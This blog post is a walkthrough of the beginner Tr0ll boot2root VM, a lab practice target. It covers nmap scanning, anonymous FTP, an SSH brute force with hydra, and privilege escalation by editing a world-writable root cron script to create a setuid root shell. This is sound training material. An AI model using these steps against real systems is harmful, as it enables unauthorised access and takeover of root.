<!doctype html><html lang=en>
<head>
<title>
taming the troll ::
#!/bin/note
— a checkbox uncheckers notepad
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="foreword Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. I figured since the description was Difficulty: Beginner ; Type: boot2root, I could give it a smash in a evening as a bit of distraction.
">
<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
<meta name=robots content="noodp">
<link rel=canonical href=https://leonjza.github.io/blog/2014/08/15/taming-the-troll/>
<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
<link rel=stylesheet href=https://leonjza.github.io/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="taming the troll">
<meta name=twitter:description content="foreword
Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. I figured since the description was Difficulty: Beginner ; Type: boot2root, I could give it a smash in a evening as a bit of distraction.">
<meta property="og:title" content="taming the troll">
<meta property="og:description" content="foreword
Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. I figured since the description was Difficulty: Beginner ; Type: boot2root, I could give it a smash in a evening as a bit of distraction.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2014-08-15T07:12:03+00:00">
<meta property="article:modified_time" content="2014-08-15T07:12:03+00:00"><meta property="og:site_name" content="#!/bin/note
">
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>#!/bin/note
</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about/>About Me</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about/>About Me</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>taming the troll</h1>
<div class=post-meta>
<span class=post-date>
2014-08-15
</span>
<span class=post-read-time>— 8 min read</span>
</div>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li>
<ul>
<li><a href=#foreword>foreword</a></li>
<li><a href=#nomad-promise>nomad, promise</a></li>
<li><a href=#anonny-mouse-ftp>anonny-mouse ftp</a></li>
<li><a href=#nohydraplz>nohydraplz</a></li>
<li><a href=#first-shell>first shell</a></li>
<li><a href=#-and-root>&mldr; and root</a></li>
<li><a href=#for-the-curious>for the curious</a></li>
</ul>
</li>
</ul>
</nav></aside>
<h2 id=foreword>foreword</h2>
<p>Having recently started the road to <a href=http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/>OSCP</a>, <a href=https://twitter.com/Maleus21>@Maleus21</a> released <a href=http://vulnhub.com/entry/tr0ll-1,100/>Tr0ll</a> on <a href=https://twitter.com/VulnHub>@VulnHub</a>. I figured since the description was <em>Difficulty: Beginner ; Type: boot2root</em>, I could give it a smash in a evening as a bit of distraction.</p>
<h2 id=nomad-promise>nomad, promise</h2>
<p>As usual, I downloaded the VM, extracted the <code>.rar</code> and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nmap -v --reason -sV 192.168.56.101 -p-

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2
22/tcp open  ssh     syn-ack <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
80/tcp open  http    syn-ack Apache httpd 2.4.7 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</code></pre></div><p>So, <code>ssh</code>, <code>ftp</code>, and <code>http</code>. Naturally my first reaction was to inspect the web service.</p>
<figure class=left>
<img src=/images/troll_web.png>
</figure>
<p>The <code>robots.txt</code> file revealed:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>User-agent:*
Disallow: /secret
</code></pre></div><p>Browsing to <code>/secret</code> revealed yet another <em>interesting</em> piece of art:</p>
<figure class=left>
<img src=/images/troll_secret_path.png>
</figure>
<p>Right&mldr; A little early to be &lsquo;mad&rsquo;, but nonetheless, lets move on.</p>
<h2 id=anonny-mouse-ftp>anonny-mouse ftp</h2>
<p>A quick and lazy google for <code>vsftpd 3.0.2 exploit</code> didn&rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
<span style=color:#ae81ff>220</span> <span style=color:#f92672>(</span>vsFTPd 3.0.2<span style=color:#f92672>)</span>
Name <span style=color:#f92672>(</span>192.168.56.101:root<span style=color:#f92672>)</span>: anonymous
<span style=color:#ae81ff>331</span> Please specify the password.
Password:
<span style=color:#ae81ff>230</span> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp&gt; ls
<span style=color:#ae81ff>500</span> Illegal PORT command.
ftp: bind: Address already in use

ftp&gt; passive
Passive mode on.

ftp&gt; ls
<span style=color:#ae81ff>227</span> Entering Passive Mode <span style=color:#f92672>(</span>192,168,56,101,231,190<span style=color:#f92672>)</span>
<span style=color:#ae81ff>150</span> Here comes the directory listing.
-rwxrwxrwx    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>1000</span>     <span style=color:#ae81ff>0</span>            <span style=color:#ae81ff>8068</span> Aug <span style=color:#ae81ff>10</span> 00:43 lol.pcap
<span style=color:#ae81ff>226</span> Directory send OK.

ftp&gt; get lol.pcap
local: lol.pcap remote: lol.pcap
<span style=color:#ae81ff>227</span> Entering Passive Mode <span style=color:#f92672>(</span>192,168,56,101,189,113<span style=color:#f92672>)</span>
<span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> lol.pcap <span style=color:#f92672>(</span><span style=color:#ae81ff>8068</span> bytes<span style=color:#f92672>)</span>.
<span style=color:#ae81ff>226</span> Transfer complete.
<span style=color:#ae81ff>8068</span> bytes received in 0.00 secs <span style=color:#f92672>(</span>21294.3 kB/s<span style=color:#f92672>)</span>

ftp&gt; bye
<span style=color:#ae81ff>221</span> Goodbye.
</code></pre></div><p>Well that worked, and showed that we have a file <code>lol.pcap</code> to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called <code>secret_stuff.txt</code> that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:</p>
<figure class=left>
<img src=/images/troll_pcap.png>
</figure>
<p>Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to http://192.168.56.101/sup3rs3cr3tdirlol/. In this path there was a binary called <code>roflmao</code>. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
--2014-08-15 07:57:56--  http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... <span style=color:#ae81ff>200</span> OK
Length: <span style=color:#ae81ff>7296</span> <span style=color:#f92672>(</span>7.1K<span style=color:#f92672>)</span>
Saving to: <span style=color:#e6db74>`</span>roflmao<span style=color:#e6db74>&#39;
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>100%[======&gt;] 7,296       --.-K/s   in 0s
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>2014-08-15 07:57:56 (826 MB/s) - `roflmao&#39;</span> saved <span style=color:#f92672>[</span>7296/7296<span style=color:#f92672>]</span>

root@kali:~/Desktop/Tr0ll# chmod +x roflmao
root@kali:~/Desktop/Tr0ll# ./roflmao
Find address 0x0856BF to proceed
</code></pre></div><p>Nice. <code>0x0856BF</code> is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with <a href=https://twitter.com/barrebas>@barrebas</a> on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried http://192.168.56.101/0x0856BF/:</p>
<figure class=left>
<img src=/images/troll_0x856bf.png>
</figure>
<h2 id=nohydraplz>nohydraplz</h2>
<p>Cool! At this stage I was pretty sure there was not much left to gain shell. The folder <code>good_luck</code> had a file called <code>which_one_lol.txt</code> with contents:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>maleus
ps-aux
felux
Eagle11
genphlux &lt; -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
</code></pre></div><p>List of passwords? Dunno. The folder <code>this_folder_contains_the_password</code> had a file <code>Pass.txt</code> with contents:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>Good_job_:)
</code></pre></div><p>At this stage I figured this had to be either a nicely provided wordlist for some <code>hydra</code> action on the <code>ftp</code> || <code>ssh</code> service. So naturally, I copied the information to a file called <code>list.txt</code> (also made a copy of the <code>genphlux</code> word so that its on its own line), and fired up hydra on <code>ssh</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# hydra -v -V -u -L list -P list -t <span style=color:#ae81ff>1</span> -u 192.168.56.101 ssh
Hydra v7.6 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span><span style=color:#ae81ff>2013</span> by van Hauser/THC &amp; David Maciejak - <span style=color:#66d9ef>for</span> legal purposes only

<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking service ssh on port <span style=color:#ae81ff>22</span>
<span style=color:#f92672>[</span>VERBOSE<span style=color:#f92672>]</span> Resolving addresses ... <span style=color:#66d9ef>done</span>
<span style=color:#f92672>[</span>ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;maleus&#34;</span> - pass <span style=color:#e6db74>&#34;maleus&#34;</span> - <span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>169</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;ps-aux&#34;</span> - pass <span style=color:#e6db74>&#34;maleus&#34;</span> - <span style=color:#ae81ff>2</span> of <span style=color:#ae81ff>169</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;felux&#34;</span> - pass <span style=color:#e6db74>&#34;maleus&#34;</span> - <span style=color:#ae81ff>3</span> of <span style=color:#ae81ff>169</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;Eagle11&#34;</span> - pass <span style=color:#e6db74>&#34;maleus&#34;</span> - <span style=color:#ae81ff>4</span> of <span style=color:#ae81ff>169</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;genphlux &lt; -- Definitely not this one&#34;</span> - pass <span style=color:#e6db74>&#34;maleus&#34;</span> - <span style=color:#ae81ff>5</span> of <span style=color:#ae81ff>169</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;genphlux&#34;</span> - pass <span style=color:#e6db74>&#34;maleus&#34;</span> - <span style=color:#ae81ff>6</span> of <span style=color:#ae81ff>169</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;usmc8892&#34;</span> - pass <span style=color:#e6db74>&#34;maleus&#34;</span> - <span style=color:#ae81ff>7</span> of <span style=color:#ae81ff>169</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>

<span style=color:#f92672>[</span>ERROR<span style=color:#f92672>]</span> could not connect to target port <span style=color:#ae81ff>22</span>
<span style=color:#f92672>[</span>ERROR<span style=color:#f92672>]</span> ssh protocol error
<span style=color:#f92672>[</span>VERBOSE<span style=color:#f92672>]</span> Retrying connection <span style=color:#66d9ef>for</span> child <span style=color:#ae81ff>0</span>
<span style=color:#f92672>[</span>RE-ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;usmc8892&#34;</span> - pass <span style=color:#e6db74>&#34;maleus&#34;</span> - <span style=color:#ae81ff>7</span> of <span style=color:#ae81ff>169</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>

<span style=color:#f92672>[</span>ERROR<span style=color:#f92672>]</span> could not connect to target port <span style=color:#ae81ff>22</span>
<span style=color:#f92672>[</span>ERROR<span style=color:#f92672>]</span> ssh protocol error
<span style=color:#f92672>[</span>VERBOSE<span style=color:#f92672>]</span> Retrying connection <span style=color:#66d9ef>for</span> child <span style=color:#ae81ff>0</span>
<span style=color:#f92672>[</span>RE-ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;usmc8892&#34;</span> - pass <span style=color:#e6db74>&#34;maleus&#34;</span> - <span style=color:#ae81ff>7</span> of <span style=color:#ae81ff>169</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>
</code></pre></div><p>Err, the sudden errors only meant one thing&mldr; <code>fail2ban</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nmap -v --reason -Pn 192.168.56.101 -p <span style=color:#ae81ff>22</span>

PORT   STATE    SERVICE REASON
22/tcp filtered ssh     no-response

</code></pre></div><p>So, this was the first part that frustrated me and had me going <em>&ldquo;seriously&mldr; :"</em>. Maybe this was actually a list of <code>ftp</code> creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.</p>
<h2 id=first-shell>first shell</h2>
<p>I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&rsquo;s <code>thing</code>. Eventually, it was apparent that none of these words as a username/password combination was the correct one.</p>
<p>Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to <em>read</em> everything), that the password may be in this folder (<code>this_folder_contains_the_password</code>). Get it, the <code>Pass.txt</code> is the password&mldr;</p>
<p>Right, so I changed <code>hydra</code> slightly to use <code>Pass.txt</code> as a password and continued to brute with the original <code>list.txt</code> as usernames:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# hydra -v -V -u -L list -p <span style=color:#e6db74>&#34;Pass.txt&#34;</span> -t <span style=color:#ae81ff>1</span> -u 192.168.56.101 ssh
Hydra v7.6 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span><span style=color:#ae81ff>2013</span> by van Hauser/THC &amp; David Maciejak - <span style=color:#66d9ef>for</span> legal purposes only

<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> <span style=color:#ae81ff>1</span> task, <span style=color:#ae81ff>1</span> server, <span style=color:#ae81ff>13</span> login tries <span style=color:#f92672>(</span>l:13/p:1<span style=color:#f92672>)</span>, ~13 tries per task
<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking service ssh on port <span style=color:#ae81ff>22</span>
<span style=color:#f92672>[</span>VERBOSE<span style=color:#f92672>]</span> Resolving addresses ... <span style=color:#66d9ef>done</span>
<span style=color:#f92672>[</span>ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;maleus&#34;</span> - pass <span style=color:#e6db74>&#34;Pass.txt&#34;</span> - <span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>13</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;ps-aux&#34;</span> - pass <span style=color:#e6db74>&#34;Pass.txt&#34;</span> - <span style=color:#ae81ff>2</span> of <span style=color:#ae81ff>13</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>ATTEMPT<span style=color:#f92672>]</span> target 192.168.56.101 - login <span style=color:#e6db74>&#34;felux&#34;</span> - pass <span style=color:#e6db74>&#34;Pass.txt&#34;</span> - <span style=color:#ae81ff>3</span> of <span style=color:#ae81ff>13</span> <span style=color:#f92672>[</span>child 0<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 192.168.56.101   login: overflow   password: Pass.txt
</code></pre></div><p>Yay <code>overflow:Pass.txt</code> should get us a session via ssh:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101
overflow@192.168.56.101<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
Welcome to Ubuntu 14.04.1 LTS <span style=color:#f92672>(</span>GNU/Linux 3.13.0-32-generic i686<span style=color:#f92672>)</span>

<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>

Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>overflow<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>overflow<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>overflow<span style=color:#f92672>)</span>
</code></pre></div><h2 id=-and-root>&mldr; and root</h2>
<p>And so it was time for classic enumeration again. The first <em>strange</em> thing was the fact that it appeared as if all the <code>/home</code> directories apart from <code>/home/troll</code> was deleted. Weird. Other than that, there were a whole bunch of users according to <code>/etc/passwd</code>, and I can&rsquo;t run anything as <code>root</code> via <code>sudo</code>.</p>
<p>There was a file in <code>/opt/</code> called <code>lmao.py</code>, however I did not have access to read it. Soooo, more enumeration.</p>
<p><em>suddenly</em></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>Broadcast Message from root@trol
        <span style=color:#f92672>(</span>somewhere<span style=color:#f92672>)</span> at 16:05 ...

TIMES UP LOL!

Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
root@kali:~#
</code></pre></div><p>Urgh. Turns out, something is killing my ssh session every 5 minutes. <strong>Oh my word</strong>, was that annoying. I could handle everything the VM&rsquo;s offered, but this was probably the worst part of it.</p>
<p>Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the <em>thing</em> I should be finding has a more recent timestamp:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>overflow@troll:/$ find / -executable -type f 2&gt; /dev/null | egrep -v <span style=color:#e6db74>&#34;^/bin|^/var|^/etc|^/usr&#34;</span> | xargs ls -lh | grep Aug

-rwxrwxrwx <span style=color:#ae81ff>1</span> root  root    <span style=color:#ae81ff>145</span> Aug <span style=color:#ae81ff>14</span> 13:11 /lib/log/cleaner.py
-rwx--x--x <span style=color:#ae81ff>1</span> root  root    <span style=color:#ae81ff>117</span> Aug <span style=color:#ae81ff>10</span> 02:11 /opt/lmao.py
-rwxr-xr-x <span style=color:#ae81ff>1</span> root  root   2.4K Aug <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2013</span> /sbin/installkernel
-rwxrwxrwx <span style=color:#ae81ff>1</span> troll root   7.9K Aug <span style=color:#ae81ff>10</span> 00:43 /srv/ftp/lol.pcap
</code></pre></div><p>A few interesting results came from that, however, the one that held the golden nugget was <code>/lib/log/cleaner.py</code>. During my enumeration I noticed that <code>/tmp</code> got cleaned out at a really strange time as I was still trying to <code>less</code> a file in there, however, it just <em>disappeared</em>.</p>
<p>Anyways, as <code>cleaner.py</code> was owned by root and running <code>os.system</code>, I just modified it to prepare me a classic <code>getroot</code> binary:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python</span>
<span style=color:#f92672>import</span> os
<span style=color:#f92672>import</span> sys
<span style=color:#66d9ef>try</span>:
    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot &#39;</span>)
<span style=color:#66d9ef>except</span>:
    sys<span style=color:#f92672>.</span>exit()
</code></pre></div><p>I waited for that annoying &lsquo;Times UP&rsquo; message, and inspected <code>/var/tmp</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>overflow@troll:/$ ls -lah /var/tmp/
total 24K
drwxrwxrwt  <span style=color:#ae81ff>2</span> root     root     4.0K Aug <span style=color:#ae81ff>14</span> 13:11 .
drwxr-xr-x <span style=color:#ae81ff>12</span> root     root     4.0K Aug <span style=color:#ae81ff>10</span> 03:56 ..
-rwxrwxrwx  <span style=color:#ae81ff>1</span> root     root       <span style=color:#ae81ff>34</span> Aug <span style=color:#ae81ff>13</span> 01:16 cleaner.py.swp
-rwsr-xr-x  <span style=color:#ae81ff>1</span> root     root     7.2K Aug <span style=color:#ae81ff>14</span> 13:09 getroot
-rw-rw-r--  <span style=color:#ae81ff>1</span> overflow overflow   <span style=color:#ae81ff>71</span> Aug <span style=color:#ae81ff>14</span> 13:09 sh.c

overflow@troll:/$ /var/tmp/getroot
<span style=color:#75715e>#</span>
<span style=color:#75715e># id</span>
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>overflow<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,1002<span style=color:#f92672>(</span>overflow<span style=color:#f92672>)</span>

<span style=color:#75715e># ls /root</span>
proof.txt

<span style=color:#75715e># cat /root/proof.txt</span>
Good job, you did it!


702a8c18d29c6f3ca0d99ef5712bfbdc
<span style=color:#75715e>#</span>
</code></pre></div><h2 id=for-the-curious>for the curious</h2>
<p>That really annoying session that keeps dying? Turns out its <code>/opt/lmao.py</code> to blame:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># cat /opt/lmao.py</span>
<span style=color:#75715e>#!/usr/bin/env python</span>
<span style=color:#f92672>import</span> os

os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;echo &#34;TIMES UP LOL!&#34;|wall&#39;</span>)
os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;pkill -u &#39;overflow&#39;&#34;</span>)
sys<span style=color:#f92672>.</span>exit()

<span style=color:#75715e>#</span>
</code></pre></div><p>Thanks <a href=https://twitter.com/maleus21>@maleus21</a> for the VM!</p>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=https://leonjza.github.io/blog/2014/08/17/kali-linux-oracle-support/>
<span class=button__icon>←</span>
<span class=button__text>Kali Linux Oracle Support</span>
</a>
</span>
<span class="button next">
<a href=https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/>
<span class=button__text>Beating Xerxes2</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
</div>
</footer>
<script src=https://leonjza.github.io/assets/main.js></script>
<script src=https://leonjza.github.io/assets/prism.js></script>
</div>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
</body>
</html>